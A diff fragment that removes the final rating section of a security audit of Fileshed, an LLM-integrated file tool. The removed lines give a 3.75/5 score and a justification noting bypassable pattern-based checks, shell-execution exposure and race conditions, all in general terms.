-| 5% | LLM Misuse Resistance | ★★★☆☆ | 0.15 |
-| 5% | OpenWebUI Integration | ★★★☆☆ | 0.15 |
-
-**Weighted Total: 3.75 / 5.0**
-
-## Final Rating: ★★★★☆ (3.75/5)
-
-### Justification
-
-Fileshed demonstrates a mature security posture for an LLM-integrated tool, with well-considered defense-in-depth mechanisms across most axes. The architecture cleanly separates internal logic from the LLM-facing API, path validation is thorough with symlink detection, and network controls provide meaningful protection against data exfiltration.
-
-The primary deductions stem from:
-- Pattern-based security checks (SQL blocking, AWK patterns) that sophisticated attackers can bypass
-- Inherent risks of exposing shell command execution to LLMs, even with whitelisting
-- Some race condition windows in file operations
-
-The tool is suitable for deployment in controlled environments where the LLM is trusted and users are authenticated. For high-security deployments, additional hardening (SQL statement parsing, sandboxed execution) would be recommended.
+*End of Audit Report*
